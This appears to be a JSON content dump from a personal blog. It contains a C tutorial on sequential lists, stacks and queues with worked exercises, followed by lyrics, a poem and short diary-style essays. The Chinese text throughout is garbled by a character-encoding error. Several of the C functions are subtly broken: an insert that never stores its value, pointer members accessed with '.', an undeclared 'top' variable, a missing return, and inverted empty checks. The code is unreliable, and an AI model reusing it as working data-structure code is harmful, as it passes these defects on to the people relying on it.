ˆã€é˜Ÿåˆ—","date":"2021-10-05T11:16:19.000Z","updated":"2021-10-07T09:33:25.383Z","comments":true,"path":"2021/10/05/é¡ºåºè¡¨ã€æ ˆã€é˜Ÿåˆ—/","link":"","permalink":"https://xizhi-future.github.io/2021/10/05/%E9%A1%BA%E5%BA%8F%E8%A1%A8%E3%80%81%E6%A0%88%E3%80%81%E9%98%9F%E5%88%97/","excerpt":"","text":"[TOC] é¡ºåºè¡¨æ’å…¥ åˆ é™¤ ä»»æ„ä½ç½®ï¼Œç‰¹ç‚¹ï¼šé¡ºåºå­˜å‚¨ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#include&lt;stdio.h&gt;#define MAXSIZE 100typedef int datatype;typedef struct&#123; datatype a[MAXSIZE]; int size;&#125;sequence_list;//åˆå§‹åŒ–void init(sequence_list *slt)&#123; slt-&gt;size = 0;&#125;//åœ¨é¡ºåºè¡¨åéƒ¨è¿›è¡Œæ’å…¥æ“ä½œvoid insert_behind(sequence_list *slt,datatype x)&#123; if(slt-&gt;size == MAXSIZE)&#123; printf(&quot;é¡ºåºè¡¨æ˜¯æ»¡çš„ï¼&quot;);exit(1); slt-&gt;a[slt-&gt;size]=x; slt-&gt;size = slt-&gt;size+1; &#125;&#125;//æ‰“å°void print(sequence_list slt)&#123; int i; if(!slt.size) printf(&quot;é¡ºåºè¡¨æ˜¯ç©ºçš„ï¼&quot;); else for(i=0;i&lt;slt.size;i++) printf(&quot;%5d&quot;,slt.a[i]);&#125;//åˆ¤æ–­ç©º int empty(sequence_list slt)&#123; return(slt.size==0?0:1);&#125;//æŸ¥æ‰¾ å€¼ä¸º x çš„ ç»“ç‚¹ä½ç½®int find_x(sequence_list slt,datatype x)&#123; int i=0; while(slt.a[i]!=x &amp;&amp; i&lt;slt.size) i++; return(i&lt;slt.size?i:-1); &#125;//å–å¾— ç¬¬ i ä½ç½®çš„ å€¼int get_i(sequence_list slt,int i)&#123; if(i&lt;0 || i&gt;slt.size)&#123; printf(&quot;æŒ‡å®šä½ç½®ä¸å­˜åœ¨ï¼&quot;); &#125; else return(slt.a[i]);&#125;//ä»»æ„ä½ç½®æ’å…¥void insert_medium(sequence_list *slt,int position,datatype x)&#123; int i; if(slt-&gt;size == MAXSIZE) &#123;printf(&quot;é¡ºåºè¡¨æ˜¯æ»¡çš„ï¼&quot;);exit(1);&#125; if(position &lt; 0 || position &gt; slt-&gt;size) &#123;printf(&quot;æŒ‡å®šæ’å…¥ä½ç½®ä¸å­˜åœ¨ï¼&quot;);exit(1);&#125; for(i=slt-&gt;size;i&gt;position;i--) slt-&gt;a[i] = slt-&gt;a[i-1]; slt-&gt;a[position] = x; slt-&gt;size++;&#125;//åˆ é™¤ æŸä½ç½® ç»“ç‚¹å€¼void delete(sequence_list *slt,int position)&#123; int i; if(slt-&gt;size == 0) &#123;printf(&quot;é¡ºåºè¡¨æ˜¯ç©ºçš„ï¼&quot;);exit(1);&#125; if(position&lt;0 || position &gt; slt.size) &#123;printf(&quot;æŒ‡å®šåˆ é™¤ä½ç½®ä¸å­˜åœ¨ï¼&quot;);exit(1);&#125; for(i=position;i&lt;slt-&gt;size;i++) slt-&gt;a[i] = slt-&gt;a[i+1]; slt-&gt;size--;&#125; æ ˆå…ˆè¿›åå‡º æ’å…¥ åˆ é™¤ åŒä¸€ç«¯è¿›è¡Œï¼Œä¸º æ ˆé¡¶ï¼Œå¦ä¸€ç«¯å°ä½ï¼Œä¸ºæ ˆåº• æ’å…¥ åˆ é™¤ æ“ä½œ ç§°ä¸º è¿›æ ˆ å‡ºæ ˆ æ ˆå®ç°ï¼šé¡ºåºå­˜å‚¨ã€é“¾å¼å­˜å‚¨ ä»¥é¡ºåºå­˜å‚¨ä¸ºä¾‹ï¼šæ ˆåº•ï¼ša[0] æ ˆé¡¶ top è®¾å®š top æ‰€æŒ‡çš„ä½ç½® æ˜¯ ä¸‹ä¸€ä¸ªå°†è¦æ’å…¥ç»“ç‚¹çš„ä½ç½® æ ˆä¸ºç©º ï¼štop=0 1234567891011121314151617181920212223242526272829303132333435#include&lt;stdio.h&gt;#define MAXSIZE 100typedef int datatype;typedef struct&#123; datatype a[MAXSIZE]; int top;&#125;sequence_stack;//åˆå§‹åŒ–void init(sequence_stack *st)&#123; st-&gt;top = 0;&#125;//åˆ¤æ–­ æ˜¯å¦ ç©ºint empty(sequence_stack st)&#123; return(st.top==0?0:1);&#125;//å–å¾— æ ˆé¡¶ç»“ç‚¹å€¼datatype get_top(sequence_stack st)&#123; if(empty(st)) &#123;printf(&quot;æ ˆæ˜¯ç©ºçš„ï¼&quot;);exit(1);&#125; else return st.a[st.top-1];&#125;//æ’å…¥ void insert(sequence_stack *st,datatype x)&#123; if(st-&gt;top == MAXSIZE) &#123;printf(&quot;æ ˆæ˜¯æ»¡çš„ï¼&quot;);exit(1);&#125; st-&gt;a[top] = x; st-&gt;top++;&#125;//åˆ é™¤void delete(sequence_stack *st)&#123; if(st-&gt;top == 0) &#123;printf(&quot;æ ˆæ˜¯ç©ºçš„ï¼&quot;);exit(1);&#125; st-&gt;top--;&#125; 12//æ‹¬å·åŒ¹é… é˜Ÿåˆ—å…ˆè¿›å…ˆå‡º ç‰¹ç‚¹ï¼šæ’å…¥ åˆ é™¤ æ“ä½œ åˆ†åˆ«åœ¨è¡¨çš„ä¸¤ç«¯è¿›è¡Œï¼Œ æ’å…¥ å³ é˜Ÿå°¾ ï¼Œ åˆ é™¤å³ é˜Ÿé¦– front é˜Ÿé¦–ç»“ç‚¹åœ¨æ•°ç»„å…ƒç´ ä¸­çš„ä¸‹æ ‡ï¼Œ rear é˜Ÿå°¾ç»“ç‚¹åœ¨æ•°ç»„ä¸­å…ƒç´ ä¸‹æ ‡çš„ ä¸‹ä¸€ä¸ªä½ç½®ï¼Œå³ å³å°†æ’å…¥çš„ç»“ç‚¹ åœ¨æ•°ç»„ä¸­çš„ä¸‹æ ‡ ç§°ä¹‹ä¸º è¿›é˜Ÿ å’Œ å‡ºé˜Ÿ 1234567891011121314151617181920212223242526272829303132333435363738394041#include&lt;stdio.h&gt;#define MAXSIZE 100typedef int datatype;typedef struct&#123; datatype a[MAXSIZE]; int front; int rear;&#125;sequence_queue;//åˆå§‹åŒ–void init(sequence_queue *sq)&#123; sq-&gt;front = sq-&gt;rear = 0;&#125;//åˆ¤æ–­æ˜¯å¦æ˜¯ ç©ºint empty(sequence_queue sq)&#123; return(sq.front==sq.rear?0:1);&#125;//æ‰“å°void print(sequence_queue sq)&#123; int i; if(empty(sq))&#123; printf(&quot;é¡ºåºé˜Ÿåˆ—æ˜¯ç©ºçš„ï¼&quot;); &#125; else for(i=sq.front;i&lt;sq.rear;i++) printf(&quot;%5d&quot;,sq.a[i]);&#125;//æ’å…¥void insert(sequence_queue *sq,datatype x)&#123; int i; if(sq-&gt;rear == MAXSIZE) &#123;printf(&quot;é¡ºåºé˜Ÿåˆ—æ˜¯æ»¡çš„ï¼&quot;);exit(1);&#125; sq-&gt;a[sq-&gt;rear] = x; sq-&gt;rear = sq-&gt;rear+1;&#125;//åˆ é™¤void delete(sequence_queue *sq)&#123; if(sq-&gt;front == sq-&gt;rear) &#123;printf(&quot;é¡ºåºé˜Ÿåˆ—æ˜¯ç©ºçš„ï¼&quot;);exit(1);&#125; sq-&gt;front++;&#125; å¾ªç¯é˜Ÿåˆ—ä¸­ æ»¡ä¸ç©º çš„æ¡ä»¶å‡æ˜¯ front==rear å‡ºç°é—®é¢˜ é—®é¢˜è§£å†³ï¼šæ»¡ çš„æ¡ä»¶ (rear+1)%MAXSIZE=front 123456789101112131415//å¾ªç¯é˜Ÿåˆ— æ’å…¥ æ“ä½œvoid insert_c(sequence_queue *sq,datatype x)&#123; int i; if((sq-&gt;rear+1)%MAXSIZE == sq-&gt;front) &#123;printf(&quot;å¾ªç¯é˜Ÿåˆ—æ˜¯æ»¡çš„ï¼&quot;);exit(1);&#125; sq-&gt;a[sq-&gt;rear] = x; sq-&gt;rear = (sq-&gt;rear+1)%MAXSIZE;&#125;//å¾ªç¯é˜Ÿåˆ— åˆ é™¤ æ“ä½œvoid delete_c(sequence_queue *sq)&#123; if(sq-&gt;front == sq-&gt;rear) &#123;printf(&quot;å¾ªç¯é˜Ÿåˆ—æ˜¯ç©ºçš„ï¼&quot;);exit(1);&#125; sq-&gt;front = (sq-&gt;front+1)%MAXSIZE;&#125; ç¬¬äºŒç«  â€” é¢˜ç›®1.è®¾è®¡ä¸€ä¸ªç®—æ³•ï¼Œæ±‚é¡ºåºè¡¨ä¸­å€¼ä¸ºxçš„ç»“ç‚¹çš„ä¸ªæ•°ã€‚ç®—æ³•ï¼š 12345678910111213141516#include &lt;stdio.h&gt;#define N 100typedef int datatype;typedef struct &#123; int data[N]; int length;&#125;sqlist;int count(sqlist L,int x)&#123; int i,sum = 0; for(i=0;i&lt;L.length;i++)&#123; if(L.data[i] == x)&#123; sum++; &#125; &#125; return(sum);&#125; æµ‹è¯•ï¼š 1234567891011121314151617181920212223#include &lt;stdio.h&gt;#define N 100typedef int datatype;typedef struct &#123; int data[N]; int length;&#125;sqlist;int count(sqlist L,int x)&#123; int i,sum = 0; for(i=0;i&lt;L.length;i++)&#123; if(L.data[i] == x)&#123; sum++; &#125; &#125; return(sum);&#125;int main()&#123; sqlist list = &#123;&#123;1,5,5,2,7,5,9,0&#125;,10&#125;; printf(&quot;count = %d\\n&quot;,count(list,5)); //æŸ¥æ‰¾å€¼ä¸º5çš„å…ƒç´ ä¸ªæ•° return 0;&#125; 2.è®¾è®¡ä¸€ä¸ªç®—æ³•ï¼Œå°†ä¸€ä¸ªé¡ºåºè¡¨å€’ç½®ã€‚å³ï¼Œå¦‚æœé¡ºåºè¡¨å„ä¸ªç»“ç‚¹å€¼å­˜å‚¨åœ¨ä¸€ç»´æ•°ç»„aä¸­ï¼Œå€’ç½®çš„ç»“æœæ˜¯ä½¿å¾—æ•°ç»„aä¸­çš„a[0]ç­‰äºåŸæ¥çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œa[1] ç­‰äºåŸæ¥çš„å€’æ•°ç¬¬2ä¸ªå…ƒç´ ï¼Œâ€¦ï¼Œaçš„æœ€åä¸€ä¸ªå…ƒç´ ç­‰äºåŸæ¥çš„ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚ç®—æ³•ï¼š 12345678910111213141516171819#include&lt;stdio.h&gt;#define N 100typedef int datatype;typedef struct &#123; int data[N]; int length;&#125;sqlist; void reverse(sqlist *L)&#123; int i,j,t; i = 0; // ç¬¬ä¸€ä¸ªå…ƒç´ ä½ç½® j = L-&gt;length - 1; // æœ€åä¸€ä¸ªå…ƒç´ ä½ç½® while(i&lt;j)&#123; t = L-&gt;data[i]; // å°†ç¬¬ä¸€ä¸ªå…ƒç´ å­˜å…¥ ä¸´æ—¶çš„ t ä¸­ L-&gt;data[i++] = L-&gt;data[j]; // æŠŠæœ€åä¸€ä¸ªå…ƒç´ å€¼èµ‹ç»™ç¬¬ä¸€ä¸ªå…ƒç´ çš„ä½ç½® L-&gt;data[j--] = t; // å†æŠŠ å­˜å…¥ t çš„ç¬¬ä¸€ä¸ªå…ƒç´ çš„å€¼èµ‹ç»™ // æ³¨æ„ï¼šj-- çš„æ„æ€ï¼šé¦–å…ˆè¿›è¡Œèµ‹å€¼ç„¶åå†è¿›è¡Œè‡ªå‡ &#125;&#125; æµ‹è¯•ï¼š 1234567891011121314151617181920212223242526272829#include&lt;stdio.h&gt;#define N 100typedef int datatype;typedef struct &#123; int data[N]; int length;&#125;sqlist; void reverse(sqlist *L)&#123; int i,j,t; i = 0; // ç¬¬ä¸€ä¸ªå…ƒç´ ä½ç½® j = L-&gt;length - 1; // æœ€åä¸€ä¸ªå…ƒç´ ä½ç½® while(i&lt;j)&#123; t = L-&gt;data[i]; // å°†ç¬¬ä¸€ä¸ªå…ƒç´ å­˜å…¥ ä¸´æ—¶çš„ t ä¸­ L-&gt;data[i++] = L-&gt;data[j]; // æŠŠæœ€åä¸€ä¸ªå…ƒç´ å€¼èµ‹ç»™ç¬¬ä¸€ä¸ªå…ƒç´ çš„ä½ç½® L-&gt;data[j--] = t; // å†æŠŠ å­˜å…¥ t çš„ç¬¬ä¸€ä¸ªå…ƒç´ çš„å€¼èµ‹ç»™ // æ³¨æ„ï¼šj-- çš„æ„æ€ï¼šé¦–å…ˆè¿›è¡Œèµ‹å€¼ç„¶åå†è¿›è¡Œè‡ªå‡ &#125;&#125;int main()&#123; int i; sqlist list = &#123;&#123;1,2,3,4,5,6,7,8,9,0&#125;,10&#125;; reverse(&amp;list); for(i=0;i&lt;list.length;i++)&#123; printf(&quot;%d\\n&quot;,list.data[i]); &#125; return 0;&#125; 3.å·²çŸ¥ä¸€ä¸ªé¡ºåºè¡¨ä¸­çš„å„ç»“ç‚¹å€¼æ˜¯ä»å°åˆ°å¤§æœ‰åºçš„ï¼Œè®¾è®¡ä¸€ä¸ªç®—æ³•ï¼Œæ’å…¥ä¸€ä¸ªå€¼ä¸ºxçš„ç»“ç‚¹ï¼Œä½¿é¡ºåºè¡¨ä¸­çš„ç»“ç‚¹ä»ç„¶æ˜¯ä»å°åˆ°å¤§æœ‰åºã€‚ç®—æ³•ï¼š 1234567891011121314151617181920#include &lt;stdio.h&gt;#define N 100typedef int datatype;typedef struct &#123; int data[N]; int length;&#125;sqlist;void insert(sqlist *L,datatype x)&#123; int i; if(L-&gt;length &lt; N)&#123; //ç¡®ä¿é¡ºåºè¡¨ä¸æ»¡ï¼Œèƒ½å¤Ÿè¿›è¡Œæ’å…¥æ•°æ® i = L-&gt;length - 1; // i æ˜¯æœ€åä¸€ä¸ªå…ƒç´ ä½ç½® while(i &gt;= 0 &amp;&amp; L-&gt;data[i] &gt; x)&#123; // ç¡®ä¿ x å°äºå·²ç»™ä½ç½®ï¼Œä¾¿äºå°† x æ’å…¥åˆ°å…¶å‰é¢ L-&gt;data[i+1] = L-&gt;data[i]; i--; &#125; L-&gt;data[i+1] = x; // æ’å…¥ x L-&gt;length++; // é¡ºåºè¡¨é•¿åº¦åŠ  1 &#125;&#125; æµ‹è¯•ï¼š 123456789101112131415161718192021222324252627282930#include &lt;stdio.h&gt;#define N 100typedef int datatype;typedef struct &#123; int data[N]; int length;&#125;sqlist;void insert(sqlist *L,datatype x)&#123; int i; if(L-&gt;length &lt; N)&#123; //ç¡®ä¿é¡ºåºè¡¨ä¸æ»¡ï¼Œèƒ½å¤Ÿè¿›è¡Œæ’å…¥æ•°æ® i = L-&gt;length - 1; // i æ˜¯æœ€åä¸€ä¸ªå…ƒç´ ä½ç½® while(i &gt;= 0 &amp;&amp; L-&gt;data[i] &gt; x)&#123; // ç¡®ä¿ x å°äºå·²ç»™ä½ç½®ï¼Œä¾¿äºå°† x æ’å…¥åˆ°å…¶å‰é¢ L-&gt;data[i+1] = L-&gt;data[i]; i--; &#125; L-&gt;data[i+1] = x; // æ’å…¥ x L-&gt;length++; // é¡ºåºè¡¨é•¿åº¦åŠ  1 &#125;&#125;int main()&#123; int i; sqlist list = &#123;&#123;1,3,6,8,22,44,89,122,243,534&#125;,10&#125;; insert(&amp;list,350); for(i=0;i&lt;list.length;i++)&#123; printf(&quot;%d\\n&quot;,list.data[i]); &#125; return 0;&#125;","categories":[{"name":"æ•°æ®ç»“æ„","slug":"æ•°æ®ç»“æ„","permalink":"https://xizhi-future.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}],"tags":[{"name":"é¡ºåºè¡¨","slug":"é¡ºåºè¡¨","permalink":"https://xizhi-future.github.io/tags/%E9%A1%BA%E5%BA%8F%E8%A1%A8/"},{"name":"çº¿æ€§å­˜å‚¨","slug":"çº¿æ€§å­˜å‚¨","permalink":"https://xizhi-future.github.io/tags/%E7%BA%BF%E6%80%A7%E5%AD%98%E5%82%A8/"}],"author":"xizhi-future"},{"title":"ä¸–é—´ç¾å¥½ä¸ä½ ç¯ç¯ç›¸æ‰£","slug":"ä¸–é—´ç¾å¥½ä¸ä½ ç¯ç¯ç›¸æ‰£","date":"2021-10-01T11:42:25.000Z","updated":"2021-10-01T11:43:15.379Z","comments":true,"path":"2021/10/01/ä¸–é—´ç¾å¥½ä¸ä½ ç¯ç¯ç›¸æ‰£/","link":"","permalink":"https://xizhi-future.github.io/2021/10/01/%E4%B8%96%E9%97%B4%E7%BE%8E%E5%A5%BD%E4%B8%8E%E4%BD%A0%E7%8E%AF%E7%8E%AF%E7%9B%B8%E6%89%A3/","excerpt":"","text":"ä¸–é—´ç¾å¥½ä¸ä½ ç¯ç¯ç›¸æ‰£ååç§‰çƒ›å¤œæ¸¸ åˆå¤œæ˜Ÿè¾° ä¼¼å¥”èµ°ä¹‹å‹ çˆ±ä½ æ¯ä¸ªç»“ç—‚ä¼¤å£ é…¿æˆçš„é™ˆå¹´çƒˆé…’ å…¥å–‰å°šç®—å¯å£ æ€ä¹ˆæ³ªæ°´ è¿˜å¶å°”å¤±å®ˆ é‚€ä½ ç»†çœ‹å¿ƒä¸­ç¼ºå£ è£‚ç¼ä¸­ç•™å­˜ æ¸©æŸ” æ­¤æ—¶å·²èºé£è‰é•¿ çˆ±çš„äººæ­£åœ¨è·¯ä¸Š æˆ‘çŸ¥ä»–é£é›¨å…¼ç¨‹ é€”ç»æ—¥æš®ä¸èµ ç©¿è¶Šäººæµ· åªä¸ºä¸ä½ ç›¸æ‹¥ æ­¤åˆ»å·²çš“æœˆå½“ç©º çˆ±çš„äººæ‰‹æ§æ˜Ÿå…‰ æˆ‘çŸ¥ä»–ä¹˜é£ç ´æµª å»äº†é»‘æš—ä¸€è¶Ÿ æ„ŸåŒèº«å— ç»™ä½ æ•‘èµçƒ­ æœ› çŸ¥é“ä½ ä¸èƒ½ è¿˜è¦ä½ æ„Ÿå— è®©æ˜Ÿå…‰åŠ äº†ä¸€ç‚¹å½©è™¹ è®©æ¨±èŠ±å·å· å»ä½ é¢å¤´ è®©ä¸–é—´ç¾å¥½ ä¸ä½ ç¯ç¯ç›¸æ‰£ æ­¤æ—¶å·²èºé£è‰é•¿ çˆ±çš„äººæ­£åœ¨è·¯ä¸Š æˆ‘çŸ¥ä»–é£é›¨å…¼ç¨‹ é€”ç»æ—¥æš®ä¸èµ ç©¿è¶Šäººæµ· åªä¸ºä¸ä½ ç›¸æ‹¥ æ­¤åˆ»å·²çš“æœˆå½“ç©º çˆ±çš„äººæ‰‹æ§æ˜Ÿå…‰ æˆ‘çŸ¥ä»–ä¹˜é£ç ´æµª å»äº†é»‘æš—ä¸€è¶Ÿ æ„ŸåŒèº«å— ç»™ä½ æ•‘èµçƒ­ æœ› æ­¤æ—¶å·²èºé£è‰é•¿ çˆ±çš„äººæ­£åœ¨è·¯ä¸Š æˆ‘çŸ¥ä»–é£é›¨å…¼ç¨‹ é€”ç»æ—¥æš®ä¸èµ ç©¿è¶Šäººæµ· åªä¸ºä¸ä½ ç›¸æ‹¥ æ­¤åˆ»å·²çš“æœˆå½“ç©º çˆ±çš„äººæ‰‹æ§æ˜Ÿå…‰ æˆ‘çŸ¥ä»–ä¹˜é£ç ´æµª å»äº†é»‘æš—ä¸€è¶Ÿ æ„ŸåŒèº«å— ç»™ä½ æ•‘èµçƒ­ æœ› çŸ¥é“ä½ ä¸èƒ½ è¿˜è¦ä½ æ„Ÿå— è®©æ˜Ÿå…‰åŠ äº†ä¸€ç‚¹å½©è™¹ å½“æ¨±èŠ±å¼€çš„çº·çº·æ‰¬æ‰¬ å½“ä¸–é—´ç¾å¥½ ä¸ä½ ç¯ç¯ç›¸æ‰£","categories":[{"name":"éŸ³ä¹åˆ†äº«","slug":"éŸ³ä¹åˆ†äº«","permalink":"https://xizhi-future.github.io/categories/%E9%9F%B3%E4%B9%90%E5%88%86%E4%BA%AB/"}],"tags":[],"author":"xizhi-future"},{"title":"å”¯æ„¿æˆ‘ä»¬","slug":"å”¯æ„¿æˆ‘ä»¬","date":"2021-10-01T11:40:26.000Z","updated":"2021-10-01T11:41:42.683Z","comments":true,"path":"2021/10/01/å”¯æ„¿æˆ‘ä»¬/","link":"","permalink":"https://xizhi-future.github.io/2021/10/01/%E5%94%AF%E6%84%BF%E6%88%91%E4%BB%AC/","excerpt":"","text":"å”¯æ„¿æˆ‘ä»¬ä»é²œè¡£æ€’é©¬åˆ°é¬“æŸ“ç™½å‘ ä¸è¿‡å¼¹æŒ‡ä¸€åˆ¹é‚£ï¼› ä»å°æ¡¥äººå®¶åˆ°æ²§æµ·æ— æ¶¯ åŒ†åŒ†ä¸€çœ¼å°½ç¹åã€‚ æµå¹´ä¼¼æ°´ï¼Œ å¾€äº‹ä¸å¯è¿½ï¼› å…‰é˜´ä¼¼ç®­ï¼Œ ç‰©æ˜¯äººå·²éã€‚ è®©çƒ¦æ¼ç¼ ç»•å¿ƒå°–ï¼Œ ç”Ÿæ´»ä¸€ç‰‡é¢“ç„¶ï¼› è®©ç—›è‹¦å¾˜å¾Šè€³è¾¹ï¼Œ äººç”Ÿå…¨æ˜¯ä¸æ»¡ã€‚ æ„Ÿæƒ…çš„é—æ†¾ï¼Œ ä¸å¦‚æ”¾æ‰‹éšä»–ã€‚ æƒ³é€ä½ å›å®¶çš„äººï¼Œ ä¸œè¥¿å—åŒ—éƒ½é¡ºè·¯ï¼› æƒ³é™ªä½ åƒé¥­çš„äººï¼Œ é…¸ç”œè‹¦è¾£éƒ½å¯å£ï¼› æƒ³è§ä½ ä¸€é¢çš„äººï¼Œ éš”å±±éš”æµ·éƒ½èƒ½æ¥ã€‚ ç”Ÿæ´»çš„åˆéš¾ï¼Œ ä¸å¦‚çœ‹æ·¡æ”¾å®½ã€‚ ç”Ÿå‘½è¿™ä¸€ç¨‹ï¼Œ äº¤ç»‡ç€é£éœœé›¨é›ªï¼› äººç”Ÿè¿™ä¸€æ®µï¼Œ å¤¹æ‚ç€æ³¥æ³åå·ã€‚ æ²¡æœ‰è·¨ä¸è¿‡çš„æ²³ï¼Œ æ²¡æœ‰è¿ˆä¸è¿‡çš„åã€‚ å†…å¿ƒçš„æ‰§è¿·ï¼Œ ä¸å¦‚éšé£é£˜æ•£ã€‚ æœ‰ä¸€å¾€æ— å‰ï¼Œ å°±æœ‰çŸ¥éš¾è€Œé€€ã€‚ çœ‹é€äº†ï¼Œ ä¾¿æ˜¯è¿‡çœ¼äº‘çƒŸï¼› æƒ³é€šäº†ï¼Œ ä¸è¿‡æ˜™èŠ±ä¸€ç°ã€‚ ä¸å¿µè¿‡å»ï¼Œ ä¸ç•å°†æ¥ï¼Œ ä½ è‹¥ä¸æ”¾å¿ƒä¸Šï¼Œ å²æœˆä¾¿ä¼šæ— æ™ã€‚ è¾¹èµ°è¾¹çœ‹ï¼Œ æ˜¯ä¸€ç§ä¼˜é›…ï¼› è¾¹èµ°è¾¹å¿˜ï¼Œ æ˜¯ä¸€ä»½è±è¾¾ã€‚ æ•¬å¾€äº‹ä¸€æ¯é…’ï¼Œ æ„¿å²æœˆä¸å›å¤´ã€‚ å”¯æ„¿æˆ‘ä»¬ï¼š è¿‡å»çš„ï¼Œ åˆ«å†é—æ†¾ï¼› æœªæ¥çš„ï¼Œ æ— é¡»å¿§è™‘ï¼› ç°åœ¨çš„ï¼Œ åŠ å€çæƒœã€‚","categories":[{"name":"ç”Ÿæ´»æ‚è°ˆ","slug":"ç”Ÿæ´»æ‚è°ˆ","permalink":"https://xizhi-future.github.io/categories/%E7%94%9F%E6%B4%BB%E6%9D%82%E8%B0%88/"}],"tags":[],"author":"xizhi-future"},{"title":"éš¾ç†¬çš„ä¸€å¤œ","slug":"éš¾ç†¬çš„ä¸€å¤œ","date":"2021-10-01T11:38:19.000Z","updated":"2021-10-01T11:39:46.754Z","comments":true,"path":"2021/10/01/éš¾ç†¬çš„ä¸€å¤œ/","link":"","permalink":"https://xizhi-future.github.io/2021/10/01/%E9%9A%BE%E7%86%AC%E7%9A%84%E4%B8%80%E5%A4%9C/","excerpt":"","text":"éš¾ä»¥æƒ³è±¡ï¼Œç°åœ¨æ˜¯8æœˆ27æ—¥5ï¼š56ï¼Œæˆ‘ç°åœ¨æ­£èººåœ¨åºŠä¸Šï¼Œå†™ç€è¿™ç¯‡æ„Ÿæƒ³ã€‚ è¿™ä¸ªæ—¶é—´ï¼Œå¯¹äºæˆ‘æ¥è¯´ï¼Œæ€ä¹ˆå¯èƒ½ï¼Œä¸åœ¨ç¡è§‰ï¼Œå¯äº‹å®æ˜¯ï¼Œä»€ä¹ˆé¬¼ï¼Œæˆ‘ç®€ç›´ä¸æ•¢ç›¸ä¿¡ï¼Œæˆ‘å…¥æˆå°± è¿™ä¹ˆæ·±å—ï¼Œä»å‰æ ¹æœ¬æ²¡æœ‰è¿™æ ·è¿‡ï¼Œæ•´æ•´ä¸€ä¸ªæ™šä¸Šï¼Œæˆ‘æ»¡è„‘å­éƒ½æ˜¯å‰§æƒ…ï¼Œå¯æ€•çš„å‰§æƒ…ã€‚å¤œé‡Œï¼Œå¥½å¤š æ¬¡æ¸…é†’ç€ï¼Œå´åˆä¸æ•¢ççœ¼ï¼Œç”Ÿæ€•ä¸€ççœ¼ï¼Œå°±ä¼šæœ‰é‚£å¼ è„¸å‡ºç°åœ¨æˆ‘çš„çœ¼å‰ã€‚è¦ä¹ˆå°±æ˜¯æ»¡è„‘å­çš„ç”·ä¸» å¥³ä¸»ï¼Œæˆ‘å¯¹ç”·ä¸»çš„ç»å†æ„Ÿåˆ°å¾ˆéš¾è¿‡ï¼Œå¹¶ä¸æ˜¯ä»–çš„é”™å•Šï¼Œä»–ä¹Ÿå¾ˆç—›è‹¦å•Šï¼Œå¯æ˜¯ä¸ºä»€ä¹ˆè¦è®©ä»–æ¥æ‰¿å— è¿™ä¸€åˆ‡ã€‚å“ï¼Œæ€»ä¹‹ï¼Œæˆ‘å¾ˆä¼¤å¿ƒï¼Œæ›´ä¸ºä¹‹å¿ƒç—›ã€‚ å¤©è‰²æ¸æ¸æ˜æœ—ï¼Œæˆ‘å¬è§äº†ä¸‹é¢é˜¿å§¨çš„æ‰«åœ°å£°ï¼Œçªç„¶å°±ä¸è§‰ç€å®³æ€•äº†ï¼Œå› ä¸ºï¼Œè¿™ä¸ªä¸–ç•Œå¾ˆç¾å¥½çš„ä¸ æ˜¯å—ï¼Ÿä½ è‡ªå·±ä¸ä¹Ÿè¯´è¿‡ï¼Œè¿™ä¸ªä¸–ç•Œï¼Œè¿œæ¯”ä½ æƒ³è±¡çš„æ›´åŠ ç¾å¥½ï¼å¤ªé˜³æ€»ä¼šå‡èµ·ï¼Œä¸–ç•Œæ€»ä¼šè¿æ¥å…‰ æ˜ã€‚ å°±å½“æ˜¯åœ¨ç»™è‡ªå·±å£®èƒ†å§ï¼Œä¸–ç•Œçš„é»‘æš—ä¹Ÿæ€»å¾—æœ‰äººçŸ¥é“ï¼Œå®ƒåœ¨å¸®åŠ©æˆ‘ä»¬å˜å¾—æ›´åŠ å‹‡æ•¢ã€‚ 2021.8.27 6ï¼š12","categories":[{"name":"ç”Ÿæ´»æ‚è°ˆ","slug":"ç”Ÿæ´»æ‚è°ˆ","permalink":"https://xizhi-future.github.io/categories/%E7%94%9F%E6%B4%BB%E6%9D%82%E8%B0%88/"}],"tags":[],"author":"xizhi-future"},{"title":"æŸ¥æ— æ­¤äºº","slug":"æŸ¥æ— æ­¤äºº","date":"2021-10-01T11:36:26.000Z","updated":"2021-10-01T11:51:12.530Z","comments":true,"path":"2021/10/01/æŸ¥æ— æ­¤äºº/","link":"","permalink":"https://xizhi-future.github.io/2021/10/01/%E6%9F%A5%E6%97%A0%E6%AD%A4%E4%BA%BA/","excerpt":"","text":"æ‘ä¸Šæ˜¥æ ‘è¯´ â€œä½ è¦è®°å¾—é‚£äº›é»‘æš—ä¸­é»˜é»˜æŠ±ç´§ä½ çš„äººï¼Œé€—ä½ ç¬‘çš„äººï¼Œé™ªä½ å½»å¤œèŠå¤©çš„äººï¼Œåè½¦æ¥çœ‹æœ›ä½ çš„äººï¼Œå¸¦ ç€ä½ å››å¤„æ¸¸è¡çš„äººï¼Œè¯´æƒ³å¿µä½ çš„äººã€‚æ˜¯è¿™äº›äººç»„æˆä½ ç”Ÿå‘½ä¸­ä¸€ç‚¹ä¸€æ»´çš„æ¸©æš–ï¼Œæ˜¯è¿™äº›æ¸©æš–ä½¿ä½ æˆ ä¸ºå–„è‰¯çš„äººã€‚â€ ç„¶åï¼Œåœ¨è¯„è®ºä¸­æˆ‘çœ‹åˆ°äº†ï¼Œï¼Œï¼ŒæŸ¥æ— æ­¤äººã€‚ã€‚ã€‚","categories":[{"name":"ç”Ÿæ´»æ‚è°ˆ","slug":"ç”Ÿæ´»æ‚è°ˆ","permalink":"https://xizhi-future.github.io/categories/%E7%94%9F%E6%B4%BB%E6%9D%82%E8%B0%88/"}],"tags":[],"author":"xizhi-future"},{"title":"èƒ¡é€‚ä¸æ±Ÿå†¬ç§€","slug":"èƒ¡é€‚ä¸æ±Ÿå†¬ç§€","date":"2021-10-01T11:34:34.000Z","updated":"2021-10-01T11:35:33.614Z","comments":true,"path":"2021/10/01/èƒ¡é€‚ä¸æ±Ÿå†¬ç§€/","link":"","permalink":"https://xizhi-future.github.io/2021/10/01/%E8%83%A1%E9%80%82%E4%B8%8E%E6%B1%9F%E5%86%AC%E7%A7%80/","excerpt":"","text":"å¥¹å¹¶éå°è‚šé¸¡è‚ 